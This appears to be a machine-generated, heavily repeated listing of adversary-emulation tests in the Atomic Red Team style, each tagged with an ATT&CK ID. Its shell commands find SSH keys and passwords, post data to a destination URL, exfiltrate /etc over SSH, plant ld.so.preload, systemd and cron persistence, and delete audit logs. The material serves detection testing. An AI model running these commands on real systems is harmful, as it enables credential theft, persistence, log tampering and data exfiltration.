rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1055 ,T1501 ,T1064 ,T1145 ,T1217 ,T1036 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1217: Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.
find / -path "*.mozilla/firefox/*/places.sqlite" -exec echo {} >> ~/output/firefox-bookmarks.txt \;


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1206 ,T1158 ,T1154 ,T1145 ,T1083 ,T1222 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1083: Find or discover files on the file system
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' >> ~/output/nix.txt
cat /etc/mtab >> ~/output/nix.txt
#find . -type f -iname *.pdf > ~/output/nix.txt
find . -type f -name ".*"


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1055 ,T1136 ,T1153 ,T1139 ,T1217 ,T1070 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1217: Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.
find / -path "*.mozilla/firefox/*/places.sqlite" -exec echo {} >> ~/output/firefox-bookmarks.txt \;


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1206 ,T1168 ,T1153 ,T1145 ,T1069 ,T1070 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1069: Permission Groups Discovery
groups


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1055 ,T1136 ,T1153 ,T1145 ,T1069 ,T1222 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1069: Permission Groups Discovery
groups


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1055 ,T1158 ,T1153 ,T1081 ,T1082 ,T1009 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1206 ,T1158 ,T1154 ,T1145 ,T1201 ,T1222 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1201: Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
cat /etc/security/pwquality.conf >> ~/output/pwd_policy.txt


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1169 ,T1501 ,T1064 ,T1040 ,T1217 ,T1222 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1217: Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.
find / -path "*.mozilla/firefox/*/places.sqlite" -exec echo {} >> ~/output/firefox-bookmarks.txt \;


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1169 ,T1168 ,T1154 ,T1145 ,T1082 ,T1036 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1206 ,T1168 ,T1064 ,T1145 ,T1135 ,T1070 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1135: Network Share Discovery
df -aH >> ~/output/mount.txt
mount >> ~/output/mount.txt


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1055 ,T1501 ,T1153 ,T1081 ,T1069 ,T1027 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1069: Permission Groups Discovery
groups


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1169 ,T1136 ,T1064 ,T1139 ,T1018 ,T1027 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1018: Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
arp -a | grep -v '^?' >> ~/output/arp_cache.txt


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1169 ,T1501 ,T1153 ,T1081 ,T1082 ,T1222 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


